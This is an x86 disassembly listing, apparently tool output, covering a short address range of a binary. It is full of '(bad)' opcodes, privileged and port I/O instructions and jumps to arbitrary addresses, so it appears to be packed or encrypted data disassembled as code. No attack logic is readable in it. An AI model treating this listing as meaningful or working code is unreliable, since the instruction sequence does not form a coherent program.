  41950c:	(bad)  
  41950d:	or     eax,eax
  41950f:	inc    edx
  419510:	cmp    esp,DWORD PTR ds:0x6a70743d
  419516:	ret    
  419517:	sbb    al,BYTE PTR [edi-0x2ad8a390]
  41951d:	lahf   
  41951e:	push   ss
  41951f:	adc    ebp,DWORD PTR [esi-0x1fcab974]
  419525:	xchg   DWORD PTR [esi],esi
  419527:	mov    cl,0xa4
  419529:	xor    ebp,DWORD PTR [eax+0x295831ec]
  41952f:	imul   ebp,DWORD PTR ds:0x173942cc,0x0
	...
  419595:	add    BYTE PTR [edi-0x9d722c],ch
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	test   BYTE PTR [eax-0x31],0xaf
  4195a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195a6:	or     DWORD PTR [edx],0x1
  4195a9:	add    BYTE PTR [edi],al
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    BYTE PTR [eax],bh
  4195af:	cmp    al,0xf4
  4195b2:	out    0xb5,al
  4195b4:	xchg   ebx,eax
  4195b5:	mov    edx,0x23fb85a2
  4195ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195bb:	dec    edi
  4195bc:	into   
  4195bd:	in     eax,dx
  4195be:	int    0x65
  4195c0:	int3   
  4195c1:	push   es
  4195c2:	and    al,0x2c
  4195c4:	imul   esi,DWORD PTR [eax-0x7a2f5556],0xffffff83
  4195cb:	jge    0x419634
  4195cd:	pop    edi
  4195ce:	pop    edx
  4195cf:	or     DWORD PTR [esi],edx
  4195d1:	mov    al,ds:0x8f5213f8
  4195d6:	ret    0xb0d7
  4195d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195da:	xor    DWORD PTR [ebx-0x13b325a5],0xd4532cae
  4195e4:	stos   DWORD PTR es:[edi],eax
  4195e5:	std    
  4195e6:	jo     0x4195eb
  4195e8:	xchg   esp,eax
  4195e9:	sbb    eax,0x3a79e236
  4195ee:	push   DWORD PTR [eax-0x3a]
  4195f1:	mov    WORD PTR [eax-0x53f13a53],fs
  4195f7:	cmp    DWORD PTR [ebp-0x14],ebx
  4195fa:	or     al,0x3b
  4195fc:	xor    BYTE PTR [esi-0x1b904564],dh
  419602:	outs   dx,BYTE PTR ds:[esi]
  419603:	out    dx,al
  419604:	dec    esp
  419605:	sub    al,0x25
  419607:	adc    BYTE PTR ds:0xae8d94a3,bl
  41960d:	lock or eax,0x457962e1
  419613:	xchg   edx,eax
  419614:	dec    ecx
  419615:	pop    esi
  419616:	pop    ebx
  419617:	retf   
  419618:	aad    0x2a
  41961a:	cwde   
  41961b:	push   es
  41961c:	or     edi,DWORD PTR [ebx]
  41961e:	push   ecx
  41961f:	sahf   
  419620:	test   eax,0xe0be9f03
  419625:	and    DWORD PTR [ebx],ebx
  419627:	xchg   esp,eax
  419628:	or     al,0xa6
  41962a:	mov    ch,0x9c
  41962c:	push   ds
  41962d:	pop    ds
  41962e:	xor    al,0x86
  419630:	mov    al,BYTE PTR [esp+edi*1]
  419633:	scas   al,BYTE PTR es:[edi]
  419634:	in     al,dx
  419635:	xchg   esp,eax
  419636:	mov    ?,WORD PTR [ebx-0x21eed07f]
  41963c:	adc    al,0xf8
  41963e:	fwait
  41963f:	aam    0xa1
  419641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419642:	inc    ebx
  419643:	push   ebp
  419644:	stc    
  419645:	jo     0x4195db
  419647:	mov    eax,ds:0xa9efd26e
  41964c:	inc    edi
  41964d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41964e:	lock and eax,esp
  419651:	or     eax,0x44a3cf33
  419656:	jns    0x419689
  419658:	dec    edi
  419659:	rcr    dl,1
  41965b:	nop
  41965c:	xor    ebx,0xffffffe1
  41965f:	add    DWORD PTR [ecx+ebx*8+0x38b09c2f],0x2769a056
  41966a:	cmp    al,0x9
  41966c:	and    DWORD PTR [ecx],0xb663753d
  419672:	aam    0xc1
  419674:	cmp    BYTE PTR [esi+ecx*4+0x74],ch
  419678:	dec    esi
  419679:	in     eax,dx
  41967a:	dec    edx
  41967b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41967c:	arpl   WORD PTR [eax-0x43],bp
  41967f:	aad    0x40
  419681:	repnz mov ch,al
  419684:	jns    0x4196ce
  419686:	sbb    ah,BYTE PTR [eax]
  419688:	and    ebx,ebp
  41968a:	mov    cl,0xa9
  41968c:	arpl   bp,cx
  41968e:	sbb    ebp,edi
  419690:	jns    0x4196dd
  419692:	sub    DWORD PTR [eax],edx
  419694:	mov    ds:0xa4555f12,al
  419699:	loopne 0x4196f8
  41969b:	mov    BYTE PTR [edi],al
  41969d:	cmp    al,0xb8
  41969f:	repz mov bl,0x56
  4196a2:	fmul   QWORD PTR [edx+0x40]
  4196a5:	push   0x7ff2b167
  4196aa:	pop    esi
  4196ab:	fild   QWORD PTR [ebx]
  4196ad:	jmp    0xf0ea4354
  4196b2:	mov    bl,0x8
  4196b4:	sub    DWORD PTR [eax],eax
	...
  419716:	mov    bl,0x3f
  419718:	jno    0x41977f
  41971a:	std    
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	retf   
  419723:	adc    ebx,0x48
  419726:	mov    cl,BYTE PTR [ebx]
  419728:	add    DWORD PTR [eax],eax
  41972a:	pop    es
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    bh,al
  41972f:	xchg   edx,eax
  419730:	pop    ecx
  419731:	mov    edi,0x51b5f6dc
  419736:	iret   
  419737:	mov    cr3,ebp
  41973a:	fadd   st(5),st
  41973c:	jmp    0x4197a4
  41973e:	in     eax,dx
  41973f:	les    esp,FWORD PTR [ebp+eiz*2+0x7cba6759]
  419746:	loopne 0x4197a9
  419748:	mov    DWORD PTR [ecx],esi
  41974a:	scas   eax,DWORD PTR es:[edi]
  41974b:	sub    bl,bl
  41974d:	imul   ecx,DWORD PTR [ecx+0x405ab320],0xc011270d
  419757:	xchg   BYTE PTR [edi+0x8],ch
  41975a:	mov    DWORD PTR [eax],ecx
  41975c:	xlat   BYTE PTR ds:[ebx]
  41975d:	lods   eax,DWORD PTR ds:[esi]
  41975e:	test   al,0x74
  419760:	not    dl
  419762:	jae    0x4196f8
  419764:	sbb    esp,eax
  419766:	neg    BYTE PTR [ecx+0x3593f68b]
  41976c:	(bad)  
  41976d:	push   ss
  41976e:	les    edi,FWORD PTR [ecx-0x50f30b1]
  419774:	sub    eax,0x19e4eb7
  419779:	dec    eax
  41977a:	rcl    ch,1
  41977c:	jo     0x419782
  41977e:	scas   al,BYTE PTR es:[edi]
  41977f:	mov    esp,ds
  419781:	push   esp
  419782:	mov    bh,BYTE PTR [esi]
  419784:	adc    eax,edx
  419786:	jns    0x41974a
  419788:	ins    BYTE PTR es:[edi],dx
  419789:	ret    
  41978a:	and    bl,bh
  41978c:	mov    dl,BYTE PTR [ebp+0x71e8cfde]
  419792:	pop    edi
  419793:	push   ds
  419794:	out    0x6b,al
  419796:	mov    al,0xeb
  419798:	jge    0x4197ef
  41979a:	mov    eax,0x88d02454
  41979f:	(bad)  
  4197a0:	fild   DWORD PTR [ebx]
  4197a2:	in     eax,0x83
  4197a4:	pop    esp
  4197a5:	ret    0x2aa
  4197a8:	ja     0x4197d7
  4197aa:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4197ac:	je     0x41979d
  4197ae:	inc    edx
  4197af:	mov    ds:0x9a30c53a,eax
  4197b4:	cmp    DWORD PTR [eax+0x10df5c9e],ebx
  4197ba:	ror    BYTE PTR [esi+ecx*4+0x2d],cl
  4197be:	in     eax,0xce
  4197c0:	xor    al,0x28
  4197c2:	enter  0xf8e5,0xa
  4197c6:	xor    al,0xb
  4197c8:	pop    ebx
  4197c9:	xchg   esi,eax
  4197ca:	mov    ds:0x22b4c732,al
  4197cf:	enter  0x61a7,0x2c
  4197d3:	adc    DWORD PTR [edi-0x48],ebx
  4197d6:	in     al,dx
  4197d7:	mov    edx,0xc1502710
  4197dc:	call   0x88b9:0x85203e52
  4197e3:	fisttp QWORD PTR [ebx]
  4197e5:	daa    
  4197e6:	ret    0x3f93
  4197e9:	add    ebx,DWORD PTR [esi]
  4197eb:	out    dx,al
  4197ec:	daa    
  4197ed:	cmp    ch,ch
  4197ef:	sub    DWORD PTR ds:0xbb94db95,eax
  4197f5:	jecxz  0x41986c
  4197f7:	cmp    BYTE PTR [esp+eiz*2+0x36],ah
  4197fb:	stc    
  4197fc:	es pop ebx
  4197fe:	or     esp,DWORD PTR [ebx-0x5a138bdd]
  419804:	jmp    0x419832
  419806:	stc    
  419807:	ins    DWORD PTR es:[edi],dx
  419808:	mov    dh,0x87
  41980a:	int    0xff
  41980c:	sar    ch,0x8a
  41980f:	inc    ecx
  419810:	imul   esi,ebx,0xbc453ce3
  419816:	or     al,0xc6
  419818:	addr16 repz dec edi
  41981b:	sub    eax,edx
  41981d:	jp     0x4197c1
  41981f:	rol    BYTE PTR [ecx+edx*8-0x3d],0xd8
  419824:	call   0xb151:0xe8b5b5aa
  41982b:	xchg   ebp,eax
  41982c:	sub    ebp,DWORD PTR ds:0x46c901ae
  419832:	pushf  
  419833:	push   esi
  419834:	dec    esp
	...
  419895:	add    BYTE PTR [edx-0x201eb8e7],al
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	ficom  DWORD PTR [eax-0x6e20e3e1]
  4198a7:	or     al,0x1
  4198a9:	add    BYTE PTR [edi],al
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    BYTE PTR [ebp-0x15e0f427],dl
  4198b3:	imul   esp,DWORD PTR [edi+0x2a],0xc5b11fc3
  4198ba:	out    dx,eax
  4198bb:	mov    edx,0x4c4af70f
  4198c0:	or     BYTE PTR [esi-0x2e],dh
  4198c3:	sub    eax,ebx
  4198c5:	sub    BYTE PTR [edi+0x7d1c6947],al
  4198cb:	loope  0x4198e3
  4198cd:	mov    eax,ds:0x6374a227
  4198d2:	inc    DWORD PTR [ebx+0x1a1be09a]
  4198d8:	fistp  WORD PTR [ebx-0x25]
  4198db:	adc    DWORD PTR [edx+0x4d01ca53],0xffffffac
  4198e2:	dec    ebp
  4198e3:	maskmovq mm6,(bad)
  4198e4:	div    DWORD PTR [eax]
  4198e6:	push   ds
  4198e7:	mov    ebx,0x71c108c9
  4198ec:	in     eax,0x9
  4198ee:	ins    DWORD PTR es:[edi],dx
  4198ef:	push   es
  4198f0:	jl     0x4198f4
  4198f2:	sub    eax,0x75631f07
  4198f7:	mov    cl,0xac
  4198f9:	dec    ebp
  4198fa:	test   eax,0x1e62e8d
  4198ff:	out    0x89,al
  419901:	jg     0x4198de
  419903:	mov    cl,0xd2
  419905:	outs   dx,BYTE PTR ds:[esi]
  419906:	repnz or esi,DWORD PTR [ecx-0x508432cb]
  41990d:	mov    ds:0xb345f321,al
  419912:	pop    ecx
  419913:	test   DWORD PTR [ebp+0x7b],edx
  419916:	jg     0x4198c5
  419918:	outs   dx,DWORD PTR ds:[esi]
  419919:	aam    0xda
  41991b:	sar    BYTE PTR [edx+0x25],cl
  41991e:	std    
  41991f:	sub    DWORD PTR [ebx+0x324d1be],edi
  419925:	inc    ebp
  419926:	xchg   esi,eax
  419927:	cs pop eax
  419929:	lea    esp,[ebx]
  41992b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41992c:	sub    al,0xe2
  41992e:	inc    edi
  41992f:	fstp   DWORD PTR [ecx+0x40c75d9e]
  419935:	(bad)  
  419936:	shl    DWORD PTR [ecx],cl
  419938:	cwde   
  419939:	push   esp
  41993a:	jb     0x419949
  41993c:	sbb    DWORD PTR [eax+0x48a4ce37],esp
  419942:	jnp    0x4198ff
  419944:	jmp    0xd455c861
  419949:	les    ecx,FWORD PTR [esi-0x9]
  41994c:	(bad)  
  41994d:	cmp    ch,BYTE PTR [ecx+ecx*4+0x2b]
  419951:	mov    eax,ds:0xe9965a7a
  419956:	mov    ecx,DWORD PTR [ebp-0x28]
  419959:	pop    ds
  41995a:	push   edx
  41995b:	add    BYTE PTR [ebp-0x307a1698],bl
  419961:	lahf   
  419962:	leave  
  419963:	adc    BYTE PTR [ebp-0x61ee7cfa],bh
  419969:	sbb    bl,BYTE PTR [esi]
  41996b:	jb     0x41990a
  41996d:	push   es
  41996e:	and    cl,BYTE PTR [ebp+0x21b24ef2]
  419974:	sub    bh,cl
  419976:	push   eax
  419977:	js     0x41993f
  419979:	add    BYTE PTR [esi],al
  41997b:	aas    
  41997c:	add    DWORD PTR [eax+0x62],edx
  41997f:	push   0xda4ba14b
  419984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419985:	leave  
  419986:	js     0x4199ce
  419988:	clc    
  419989:	lods   eax,DWORD PTR ds:[esi]
  41998a:	xor    cl,0x65
  41998d:	stos   DWORD PTR es:[edi],eax
  41998e:	daa    
  41998f:	add    DWORD PTR [ebp-0x1d65d8df],esp
  419995:	sub    al,0x51
  419997:	push   0xf88b0dba
  41999c:	jl     0x4199a5
  41999e:	push   esp
  41999f:	rcr    DWORD PTR [edx+0x53b78c4a],cl
  4199a5:	add    bl,bl
  4199a7:	xor    BYTE PTR [ebx-0x1],ch
  4199aa:	fimul  WORD PTR [edx+0x67]
  4199ad:	pop    ds
  4199ae:	pop    ebx
  4199af:	fnstenv [eax]
  4199b1:	jmp    0x137718e
	...
  419a16:	xor    esi,DWORD PTR [ecx]
  419a18:	xchg   ebx,eax
  419a19:	lds    edx,FWORD PTR [ebx+0x59f777e7]
  419a1f:	push   ss
  419a20:	mov    eax,ds:0x92757a09
  419a25:	out    dx,eax
  419a26:	cwde   
  419a27:	or     eax,0x1070001
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	in     al,dx
  419a2f:	pop    edx
  419a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a31:	pushf  
  419a32:	sub    BYTE PTR [ebp+0x33],ah
  419a35:	push   eax
  419a36:	(bad)
  419a39:	add    al,BYTE PTR cs:[ecx]
  419a3c:	adc    DWORD PTR [edx],esp
  419a3e:	jbe    0x419a96
  419a40:	cmp    eax,0x3509e5e0
  419a45:	adc    ah,dh
  419a47:	fst    QWORD PTR [ebx-0xab03298]
  419a4d:	ss and eax,0x28178acf
  419a53:	cmp    edi,DWORD PTR [edx]
  419a55:	dec    edi
  419a56:	(bad)
  419a5a:	stc    
  419a5b:	ret    0x5d8d
  419a5e:	dec    eax
  419a5f:	push   0xf
  419a61:	aas    
  419a62:	or     DWORD PTR [edx-0x1d],edi
  419a65:	fstp   DWORD PTR [esi]
  419a67:	dec    ecx
  419a68:	cs (bad) 
  419a6a:	mov    WORD PTR ds:0xf713d6ee,ds
  419a70:	bnd jmp 0x3e1d7d28
  419a76:	in     eax,0x7
  419a78:	stos   BYTE PTR es:[edi],al
  419a79:	or     eax,0x1fb69a89
  419a7e:	in     al,dx
  419a7f:	adc    eax,0xf7c2aaf0
  419a84:	cmp    eax,0x4b8d4669
  419a89:	inc    edi
  419a8a:	(bad)  
  419a8b:	fdivr  st(2),st
  419a8d:	xor    DWORD PTR [edx+0x65e5df82],edi
  419a93:	adc    al,0x1f
  419a95:	push   esp
  419a96:	inc    ecx
  419a97:	and    eax,0x26bcc8a2
  419a9c:	pop    ds
  419a9d:	outs   dx,DWORD PTR ds:[esi]
  419a9e:	push   ecx
  419a9f:	sub    BYTE PTR [ecx-0x41],0xef
  419aa3:	outs   dx,DWORD PTR ds:[esi]
  419aa4:	push   ecx
  419aa5:	mov    al,0x43
  419aa7:	inc    esp
  419aa8:	test   BYTE PTR [edx-0x48c28ea5],dh
  419aae:	push   0x5c79f95
  419ab3:	js     0x419a8d
  419ab5:	sbb    al,0x7d
  419ab7:	test   eax,0x8b173e18
  419abc:	test   eax,0xebf11f4c
  419ac1:	mov    ch,BYTE PTR [esi+ecx*1-0x1a56bd99]
  419ac8:	or     ah,BYTE PTR [ecx-0x53]
  419acb:	mov    eax,0x6620c377
  419ad0:	xor    al,0x4f
  419ad2:	mov    bl,0x6e
  419ad4:	inc    edx
  419ad5:	sub    dl,BYTE PTR [ecx]
  419ad7:	fdivr  DWORD PTR [ebx]
  419ad9:	cmp    dh,bl
  419adb:	iret   
  419adc:	jecxz  0x419ab0
  419ade:	lds    ebp,FWORD PTR [ecx-0x5f]
  419ae1:	dec    esi
  419ae2:	pop    ds
  419ae3:	jo     0x419ac2
  419ae5:	xor    edi,DWORD PTR [ebp-0x309a356]
  419aeb:	loope  0x419a8f
  419aed:	and    cl,BYTE PTR [edi-0x28]
  419af0:	repz icebp 
  419af2:	or     BYTE PTR [ecx+0x5d],al
  419af5:	call   0x5533:0xbaec95ca
  419afc:	out    0xbf,eax
  419afe:	and    ebp,esi
  419b00:	dec    ebp
  419b01:	and    esp,DWORD PTR [ecx+0xb]
  419b04:	dec    ebx
  419b06:	jo     0x419aec
  419b08:	cwde   
  419b09:	dec    edx
  419b0a:	sub    BYTE PTR [esi+ebx*4-0x7eed87f6],al
  419b11:	inc    eax
  419b12:	pop    ebx
  419b13:	jp     0x419b7a
  419b15:	and    eax,0xa4628fc
  419b1a:	scas   eax,DWORD PTR es:[edi]
  419b1b:	add    edx,ebp
  419b1d:	(bad)  
  419b1e:	and    eax,0x38cb4d9e
  419b23:	mov    bh,0x44
  419b25:	push   es
  419b26:	inc    ebp
  419b27:	cmp    BYTE PTR ds:0x4c71f685,dh
  419b2d:	hlt    
  419b2e:	xor    eax,0xb1999125
  419b33:	pop    esi
  419b34:	cmp    al,BYTE PTR [eax]
	...
  419b96:	dec    edx
  419b97:	(bad)  
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	push   esi
  419ba3:	cmp    BYTE PTR [ebx+0x10e9fc0],al
  419ba9:	add    BYTE PTR [edi],al
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [ecx-0x7fbe3af4],ch
  419bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bb4:	push   cs
  419bb5:	scas   al,BYTE PTR es:[edi]
  419bb6:	xchg   BYTE PTR [ebx],bh
  419bb8:	aad    0xe3
  419bba:	scas   al,BYTE PTR es:[edi]
  419bbb:	mov    ds:0x33d4a98a,eax
  419bc0:	ins    DWORD PTR es:[edi],dx
  419bc1:	xchg   esi,eax
  419bc2:	or     eax,0xa5142f27
  419bc7:	psadbw mm4,mm7
  419bca:	lock cmp BYTE PTR [edx+0xb],ah
  419bce:	pop    ds
  419bcf:	adc    bl,BYTE PTR [ebp+0x5a]
  419bd2:	sbb    eax,0x1975deed
  419bd7:	push   esi
  419bd8:	cmp    DWORD PTR [ebx+edx*2-0x6f],eax
  419bdc:	aaa    
  419bdd:	and    BYTE PTR [edx-0x1d8ef443],bh
  419be3:	jne    0x419bae
  419be5:	stos   DWORD PTR es:[edi],eax
  419be6:	xchg   edx,eax
  419be7:	fwait
  419be8:	xchg   esi,eax
  419be9:	loop   0x419b97
  419beb:	js     0x419c30
  419bed:	std    
  419bee:	imul   edi,DWORD PTR [edx+0x2990a9f0],0x4e
  419bf5:	pusha  
  419bf6:	and    al,0xac
  419bf8:	hlt    
  419bf9:	pop    ds
  419bfa:	inc    esi
  419bfb:	repnz mov bl,0x4d
  419bfe:	push   0x989eff0
  419c03:	scas   eax,DWORD PTR es:[edi]
  419c04:	pop    esp
  419c05:	push   0x73df3c34
  419c0a:	scas   eax,DWORD PTR es:[edi]
  419c0b:	sar    DWORD PTR es:[ebx+0x25],1
  419c0f:	sub    ah,BYTE PTR [edi+eax*8-0x509bbd51]
  419c16:	dec    edx
  419c17:	fisubr WORD PTR [esi]
  419c19:	xchg   ecx,eax
  419c1a:	(bad)  
  419c1b:	lahf   
  419c1c:	addr16 dec esp
  419c1e:	cs (bad) 
  419c20:	pop    esi
  419c21:	adc    BYTE PTR [ebx],bl
  419c23:	cmp    cl,al
  419c25:	dec    ebx
  419c26:	add    esi,DWORD PTR [ecx-0x41]
  419c29:	test   DWORD PTR [esi],ebx
  419c2b:	push   es
  419c2c:	sbb    BYTE PTR [eax],bh
  419c2e:	fdivr  DWORD PTR [ebx+0x1b]
  419c31:	xor    eax,0xa2acda08
  419c36:	shl    edi,1
  419c38:	sbb    bh,BYTE PTR [esi+0x3c]
  419c3b:	cli    
  419c3c:	dec    ecx
  419c3d:	ja     0x419c65
  419c3f:	retf   
  419c40:	aas    
  419c41:	or     edi,0xe4a4c2f
  419c47:	and    DWORD PTR [ecx+0x6d5b6a5b],eax
  419c4d:	mov    cl,BYTE PTR [esp+esi*8-0x770780c8]
  419c54:	jecxz  0x419c14
  419c56:	out    0x5a,eax
  419c58:	adc    al,0xf6
  419c5a:	test   DWORD PTR [ecx+0x70],ecx
  419c5d:	imul   esi,DWORD PTR [ebx+eax*8],0x8fddc596
  419c64:	mov    bl,0x3c
  419c66:	pop    es
  419c67:	sahf   
  419c68:	add    DWORD PTR [ecx-0x66],edx
  419c6b:	xor    dh,BYTE PTR [ecx]
  419c6d:	das    
  419c6e:	jmp    0x2779:0xaa4155a
  419c75:	(bad)  
  419c76:	sbb    dh,BYTE PTR [edi]
  419c78:	addr16 repz jmp 0x6118:0x30407530
  419c81:	adc    BYTE PTR [edx-0x4f0960],bh
  419c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c88:	sbb    eax,0x1ddb23f5
  419c8d:	dec    esp
  419c8e:	adc    al,0xf7
  419c90:	mov    BYTE PTR [eax+0x2d33322d],cl
  419c96:	xchg   ecx,eax
  419c97:	jg     0x419d18
  419c99:	push   eax
  419c9a:	push   ebx
  419c9b:	mov    edi,esi
  419c9d:	and    bh,BYTE PTR [ebx]
  419c9f:	push   0xb72df37f
  419ca4:	inc    ebp
  419ca5:	dec    ebp
  419ca6:	jmp    0x8fa63ae7
  419cab:	mov    WORD PTR [edi+0x6fa97627],cs
  419cb1:	adc    cl,BYTE PTR [edi+0x75]
  419cb4:	fiadd  DWORD PTR [eax]
	...
  419d16:	lock xchg edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0x29049c45
  419d24:	cwde   
  419d25:	(bad)  
  419d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d27:	sgdtd  [eax]
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    BYTE PTR [eax-0x21],bh
  419d30:	jnp    0x419d8a
  419d32:	inc    edx
  419d33:	mov    esp,0x3dea86c3
  419d38:	mov    ecx,0x89788118
  419d3d:	xchg   ebx,eax
  419d3e:	add    ch,BYTE PTR [edx]
  419d40:	in     al,0x5f
  419d42:	cmp    DWORD PTR [ebx-0x44139d4a],ebp
  419d48:	mov    al,ds:0xd4e4eb6b
  419d4d:	mov    esi,0xd1c8dc86
  419d52:	sub    DWORD PTR [edx-0x1b],ebx
  419d55:	xor    dl,BYTE PTR [ebx+0x15d9e64d]
  419d5b:	mov    DWORD PTR [ebx+ebp*4-0x42543d7b],ebp
  419d62:	pop    esp
  419d63:	cmp    dh,BYTE PTR [esi+eiz*8-0xc]
  419d67:	dec    eax
  419d68:	fcmove st,st(3)
  419d6a:	sbb    al,0x9c
  419d6c:	jno    0x419d24
  419d6e:	sbb    al,0x56
  419d70:	dec    ecx
  419d71:	sub    BYTE PTR [edi+0x3a],ah
  419d74:	pusha  
  419d75:	xchg   esp,eax
  419d76:	xchg   BYTE PTR [edi-0x60059241],cl
  419d7c:	in     al,dx
  419d7d:	dec    esp
  419d7e:	mov    bl,BYTE PTR [eax+0x7d]
  419d81:	mov    ecx,0xf9d62a00
  419d86:	scas   eax,DWORD PTR es:[edi]
  419d87:	int    0xfc
  419d89:	int3   
  419d8a:	dec    ebx
  419d8b:	out    0x62,al
  419d8d:	gs cmp eax,0xaeafd066
  419d93:	dec    ebx
  419d94:	sbb    ch,BYTE PTR [ebx-0x24e47e90]
  419d9a:	ficom  DWORD PTR [ebp-0x8]
  419d9d:	mov    cl,0x69
  419d9f:	popf   
  419da0:	int3   
  419da1:	lock and BYTE PTR cs:[edi-0x3792dcfc],ch
  419da9:	daa    
  419daa:	jg     0x419d82
  419dac:	xor    ebp,ecx
  419dae:	fstp   DWORD PTR [esi+ebx*1]
  419db1:	push   edi
  419db2:	pop    edx
  419db3:	add    dh,BYTE PTR ds:0xe2557327
  419db9:	mov    al,0x97
  419dbb:	add    eax,0xe7c01cab
  419dc0:	push   0x27
  419dc2:	cmc    
  419dc3:	sbb    al,0x4f
  419dc5:	pop    ebx
  419dc6:	inc    edi
  419dc7:	je     0x419e10
  419dc9:	mov    eax,0xe2cccb2
  419dce:	frstor [esi+0x77b7cfd2]
  419dd4:	lods   al,BYTE PTR ds:[esi]
  419dd5:	and    BYTE PTR [di],dh
  419dd8:	call   0xe2a4:0xc07b1e15
  419ddf:	(bad)  
  419de0:	fcom   QWORD PTR [eax+0x56224c3e]
  419de6:	test   DWORD PTR [edx+ecx*2-0x65a6f38d],esp
  419ded:	or     eax,0x132c3435
  419df2:	and    BYTE PTR [esi+0x151b1445],ch
  419df8:	jle    0x419e33
  419dfa:	adc    cl,dh
  419dfc:	ret    
  419dfd:	(bad)  
  419dfe:	stos   BYTE PTR es:[edi],al
  419dff:	push   edi
  419e00:	mov    ds:0xbfa355e3,eax
  419e05:	mov    WORD PTR [esi],cs
  419e07:	mov    cl,0x3a
  419e09:	mov    bl,0xa5
  419e0b:	sar    bh,1
  419e0d:	add    ah,BYTE PTR [edi-0x22]
  419e10:	or     BYTE PTR [esi+eiz*4+0x8d9c8fa],dh
  419e17:	out    dx,al
  419e18:	pop    es
  419e19:	adc    eax,DWORD PTR [ecx-0x666a2b1d]
  419e1f:	add    esi,esp
  419e21:	neg    BYTE PTR [ecx-0x192f563c]
  419e27:	xchg   DWORD PTR [eax-0x6be1c77],esi
  419e2d:	xor    al,0x45
  419e2f:	xchg   esp,eax
  419e30:	test   DWORD PTR [ecx],ebx
  419e32:	sub    al,0x60
  419e34:	loop   0x419e36
	...
  419e96:	xchg   eax,ebx
  419e98:	pop    ss
  419e99:	lds    ebx,FWORD PTR [edi-0x31]
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax+0x3e50c5a0]
  419ea3:	xlat   BYTE PTR ds:[ebx]
  419ea4:	(bad)  
  419ea5:	(bad)  
  419ea6:	lods   eax,DWORD PTR ds:[esi]
  419ea7:	adc    BYTE PTR [ecx],al
  419ea9:	add    BYTE PTR [edi],al
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    cl,ah
  419eaf:	stc    
  419eb0:	int    0x3
  419eb2:	xchg   ebp,eax
  419eb3:	mov    eax,ds:0x73097745
  419eb8:	sahf   
  419eb9:	add    al,0xf1
  419ebb:	xchg   ecx,eax
  419ebc:	std    
  419ebd:	retf   
  419ebe:	pop    ebp
  419ebf:	sub    ecx,edi
  419ec1:	mov    bl,0xa9
  419ec3:	cs aam 0x69
  419ec6:	sub    ah,BYTE PTR gs:[ebp+0x7d8a4a3a]
  419ecd:	and    BYTE PTR [edi],0x6d
  419ed0:	and    edi,DWORD PTR [edx]
  419ed2:	in     al,dx
  419ed3:	push   eax
  419ed4:	cmp    cl,dh
  419ed6:	jecxz  0x419e79
  419ed8:	push   ss
  419ed9:	inc    ebp
  419eda:	mov    ch,0xd3
  419edc:	aad    0xfd
  419ede:	int    0x20
  419ee0:	pop    esi
  419ee1:	mov    esi,0xe3cfb3e
  419ee6:	jmp    0x1a437f7f
  419eeb:	out    dx,eax
  419eec:	mov    ?,WORD PTR [ebp+0x23]
  419eef:	test   ah,ah
  419ef1:	mov    ah,0x81
  419ef3:	sub    cl,bh
  419ef5:	cmp    eax,0x75446eff
  419efa:	mov    esp,DWORD PTR [ebp+edx*8+0x7f450599]
  419f01:	shr    DWORD PTR [ecx],1
  419f03:	cmp    DWORD PTR [esi],0x6fb4e755
  419f09:	adc    dh,BYTE PTR [ebx+0x573f81a9]
  419f0f:	jmp    DWORD PTR [esi-0x2b2c69df]
  419f15:	pop    esp
  419f16:	mov    al,ds:0x296a09a0
  419f1b:	popf   
  419f1c:	cwde   
  419f1d:	stos   DWORD PTR es:[edi],eax
  419f1e:	push   ecx
  419f1f:	sbb    DWORD PTR [ecx+edi*8+0x65838952],ecx
  419f26:	js     0x419f8b
  419f28:	and    BYTE PTR [eax],0x90
  419f2b:	sub    ch,BYTE PTR [esi+esi*1]
  419f2e:	and    al,0xcf
  419f30:	mov    BYTE PTR [eax+eax*2+0x1429de75],bh
  419f37:	adc    dl,BYTE PTR [eax]
  419f39:	mov    dl,0x5
  419f3b:	jl     0x419ede
  419f3d:	shr    esi,0x8d
  419f40:	out    0x9c,al
  419f42:	in     al,dx
  419f43:	and    cl,dh
  419f45:	lea    eax,[edi+0x12]
  419f48:	mov    dh,0x63
  419f4a:	jb     0x419ed3
  419f4c:	mov    ds:0x22048ed9,eax
  419f51:	mov    ah,0x4
  419f53:	pop    esp
  419f54:	into   
  419f55:	mov    ecx,DWORD PTR [ecx+0x2e92e589]
  419f5b:	hlt    
  419f5c:	fiadd  DWORD PTR [edi+eax*8-0x466d66ff]
  419f63:	fnstenv [edi-0x62]
  419f66:	loopne 0x419f74
  419f68:	in     al,dx
  419f69:	mul    DWORD PTR [edx+0x274fb999]
  419f6f:	ins    BYTE PTR es:[edi],dx
  419f70:	mov    esp,0x31a41e22
